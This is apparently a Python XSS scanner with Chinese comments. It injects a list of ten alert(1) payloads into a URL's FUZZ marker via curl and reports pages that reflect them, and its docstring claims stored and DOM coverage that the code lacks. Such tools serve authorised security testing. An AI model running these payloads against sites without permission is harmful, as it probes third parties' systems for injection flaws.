#!/usr/bin/env python3
"""XSS快速检测 — 反射型+存储型+DOM型"""
import argparse, json, subprocess, sys, urllib.parse, time, re

XSS_PAYLOADS = [
    ("<script>alert(1)</script>", "script"),
    ("<img src=x onerror=alert(1)>", "img"),
    ("<svg onload=alert(1)>", "svg"),
    ("<details open ontoggle=alert(1)>", "details"),
    ('"><script>alert(1)</script>', "attr_escape"),
    ("'-alert(1)-'", "json_escape"),
    ("javascript:alert(1)", "href"),
    ("<ScRiPt>alert(1)</ScRiPt>", "case_bypass"),
    ("&#60;script&#62;alert(1)&#60;/script&#62;", "html_entity"),
    ("<img src=x onerror=prompt(1)>", "img_prompt"),
]

def check_xss(target, param="q", timeout=10):
    url = target if target.startswith("http") else f"https://{target}"
    results = []
    
    for payload, ptype in XSS_PAYLOADS:
        try:
            encoded = urllib.parse.quote(payload)
            test_url = url.replace("FUZZ", encoded)
            r = subprocess.run(["curl", "-sk", "-m", str(timeout), test_url], capture_output=True, text=True, timeout=timeout+5)
            body = r.stdout
            
            # 检查payload是否原样反射
            if payload in body:
                results.append({"type": "reflected", "payload_type": ptype, "payload": payload[:60], "confidence": "high"})
            # 检查部分反射
            elif any(s in body for s in ["alert(1)", "alert(1)", "onerror=alert"]):
                results.append({"type": "reflected_partial", "payload_type": ptype, "payload": payload[:60], "confidence": "medium"})
        except: pass
    
    return results

def main():
    ap = argparse.ArgumentParser(description="XSS检测器")
    ap.add_argument("--target", required=True, help="目标URL，注入点用FUZZ标记")
    ap.add_argument("--json", action="store_true")
    ap.add_argument("-o", "--output")
    args = ap.parse_args()
    
    results = check_xss(args.target)
    result = {"target": args.target, "vulnerable": len(results) > 0, "findings": results}
    
    if args.output:
        with open(args.output, "w") as f:
            json.dump(result, f, indent=2, ensure_ascii=False)
    if args.json:
        print(json.dumps(result, indent=2, ensure_ascii=False))
    else:
        print(f"[*] XSS检测: {args.target}")
        if results:
            for r in results:
                print(f"  [{r['confidence']}] {r['type']}: {r['payload_type']} ({r['payload'][:50]})")
        else:
            print("  未发现反射型XSS")

if __name__ == "__main__":
    main()